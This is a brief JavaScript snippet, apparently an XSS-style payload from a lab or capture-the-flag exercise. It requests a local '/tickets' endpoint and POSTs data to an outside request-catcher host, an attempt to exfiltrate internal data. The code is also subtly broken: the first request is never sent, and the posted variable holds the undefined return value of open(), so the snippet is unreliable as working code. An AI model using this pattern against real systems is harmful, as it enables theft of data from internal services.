const xhrr = new XMLHttpRequest();
const n = xhrr.open("GET", "http://127.0.0.1:1337/tickets",true);



const xhr = new XMLHttpRequest();
xhr.open("POST", "https://lemon.requestcatcher.com/", true);
let data = n;
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
xhr.send(data);
